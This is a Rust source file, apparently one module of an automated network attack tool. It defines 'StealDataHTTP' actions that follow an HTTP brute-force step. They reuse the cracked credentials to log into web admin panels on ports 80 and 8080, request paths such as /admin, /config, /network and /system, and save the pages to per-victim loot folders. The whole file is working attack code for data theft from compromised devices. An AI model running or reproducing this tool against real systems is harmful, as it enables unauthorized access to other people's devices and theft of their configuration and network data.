use std::sync::Arc;
use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::timeout;

use crate::actions::{Action, ActionOutcome, Target};
use crate::state::AppState;

use super::{build_output_dir, get_credentials};

/// Scrape data from HTTP endpoints after successful Basic Auth.
/// Saves page content and attempts to discover more endpoints.
/// Parent: HTTPBruteforce.
pub struct StealDataHttp;

impl Action for StealDataHttp {
    fn name(&self) -> &'static str {
        "StealDataHTTP"
    }
    fn port(&self) -> Option<u16> {
        Some(80)
    }
    fn parent(&self) -> Option<&'static str> {
        Some("HTTPBruteforce")
    }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(run(target, state))
    }
}

/// Same but for port 8080.
pub struct StealDataHttp8080;

impl Action for StealDataHttp8080 {
    fn name(&self) -> &'static str {
        "StealDataHTTP8080"
    }
    fn port(&self) -> Option<u16> {
        Some(8080)
    }
    fn parent(&self) -> Option<&'static str> {
        Some("HTTPBruteforce8080")
    }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(run(target, state))
    }
}

/// Endpoints to scrape from authenticated web admin panels.
const SCRAPE_PATHS: &[(&str, &str)] = &[
    ("/", "index.html"),
    ("/admin", "admin.html"),
    ("/status", "status.html"),
    ("/cgi-bin/", "cgi.html"),
    ("/api/v1/status", "api_status.json"),
    ("/system", "system.html"),
    ("/config", "config.html"),
    ("/network", "network.html"),
];

async fn run(target: &Target, state: &Arc<AppState>) -> ActionOutcome {
    let creds = get_credentials(state, target.host_id, "http").await;
    if creds.is_empty() {
        return ActionOutcome::Failed("no credentials".to_string());
    }

    let port = target
        .ports
        .iter()
        .find(|&&p| p == 80 || p == 8080)
        .copied()
        .unwrap_or(80);
    let local_dir = build_output_dir(state, "http", &target.mac_address, &target.ip);
    let _ = tokio::fs::create_dir_all(&local_dir).await;

    for (user, password) in &creds {
        if state.shutdown.is_cancelled() {
            break;
        }

        let result = timeout(Duration::from_secs(60), async {
            scrape_http(&target.ip, port, user, password, &local_dir).await
        })
        .await;

        match result {
            Ok(Ok(count)) if count > 0 => {
                tracing::info!(ip = %target.ip, pages = count, "HTTP pages scraped");
                return ActionOutcome::Success;
            }
            _ => {}
        }
    }

    ActionOutcome::Failed("no HTTP data scraped".to_string())
}

async fn scrape_http(
    ip: &str,
    port: u16,
    user: &str,
    password: &str,
    local_dir: &std::path::Path,
) -> Result<usize, String> {
    let credentials = format!("{user}:{password}");
    let encoded = base64_encode(&credentials);
    let auth_header = format!("Basic {encoded}");

    let mut count = 0;

    for (path, filename) in SCRAPE_PATHS {
        let addr = format!("{ip}:{port}");
        let result = timeout(Duration::from_secs(10), async {
            let mut stream = tokio::net::TcpStream::connect(&addr).await.ok()?;
            let request = format!(
                "GET {path} HTTP/1.1\r\nHost: {ip}:{port}\r\nAuthorization: {auth_header}\r\nConnection: close\r\n\r\n"
            );
            stream.write_all(request.as_bytes()).await.ok()?;

            let mut buf = Vec::new();
            stream.read_to_end(&mut buf).await.ok()?;
            Some(buf)
        })
        .await;

        if let Ok(Some(buf)) = result {
            let response = String::from_utf8_lossy(&buf);
            // Check for 200 OK
            if let Some(first_line) = response.lines().next() {
                if first_line.contains(" 200 ") {
                    // Save the body (after headers)
                    if let Some(body_start) = response.find("\r\n\r\n") {
                        let body = &response[body_start + 4..];
                        if !body.trim().is_empty() {
                            let file_path = local_dir.join(filename);
                            let _ = tokio::fs::write(&file_path, body.as_bytes()).await;
                            count += 1;
                        }
                    }
                }
            }
        }
    }

    Ok(count)
}

/// Simple base64 encoding without pulling in the base64 crate.
fn base64_encode(input: &str) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let bytes = input.as_bytes();
    let mut result = String::new();

    for chunk in bytes.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;

        result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            result.push(CHARS[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        if chunk.len() > 2 {
            result.push(CHARS[(triple & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }
    result
}
